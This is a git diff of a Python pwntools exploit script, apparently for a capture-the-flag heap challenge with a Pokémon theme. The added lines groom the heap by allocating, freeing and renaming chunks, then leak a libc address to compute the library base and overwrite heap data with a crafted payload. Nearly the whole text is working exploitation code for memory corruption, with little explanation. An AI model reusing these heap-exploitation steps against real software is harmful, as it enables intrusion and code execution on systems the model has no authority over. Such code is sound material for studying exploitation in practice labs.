@@ -61,11 +61,9 @@ def get_leak(r):
     r.clean()
     send(r, b"4")
     r.clean()
-    send(r, b"6")
-    r.recvuntil(b"ATK:")
-    num = int(r.recvlineS().strip())
-    return u64((num.to_bytes((num.bit_length() + 7) // 8, byteorder='little', signed=True if num < 0 else False) + b"\x44\x7f").ljust(8, b"\x00"))
-
+    send(r, b"3")
+    r.recvuntil(b" *Name: ")
+    return u64(r.recvline(keepends=False).ljust(8, b"\x00"))
 
 context.terminal = ['tmux', 'splitw', '-h']
 #context.log_level = "warn"
@@ -91,8 +89,10 @@ else:
 #gadgets
 text_pop_rdi = 0x401db3
 
-#LIBC = ELF("./path")
-#LIBC.address = 0xbase
+#address
+UNKNOWN = 0x402036
+
+LIBC = ELF("./libc-2.27_notcache.so")
 #LIBC.symbols["__symol_name"]
 
 input("wait")
@@ -116,7 +116,18 @@ add_pkm(r)                                      #PKM2 -> NAME2
 add_pkm(r)                                      #PKM3 -> PKM2
 add_pkm(r)                                      #PKM5 -> PKM3
 add_pkm(r)                                      #PKM6 -> PKM4
-add_pkm(r)                                      #PKM7 -> FREE this is for dodging coalascing
-kill_pkm(r, 4)
-print(hex(get_leak(r)))
+add_pkm(r)                                      #PKM7 -> done for coalasceding
+kill_pkm(r, 6)                                  
+rename_pkm(r, 3, "aaaa", 0xf8)                  #NAME3 -> PKM4
+kill_pkm(r, 4)                                  #edits NAME3 with fd
+LIBC.address = get_leak(r) - 0x3e2c80
+print_red(hex(LIBC.address))
+
+#OVERWRITE
+add_pkm(r)                                      #PKM4 -> NAME3
+add_pkm(r)                                      #PKM6
+rename_pkm(r, 3, ["d"*0x28, p64(UNKNOWN), "a"*0x28], 0xf8) # scrivo tutti gli IV, mi rimane da riempire le mosse
+
+
+
 r.interactive()
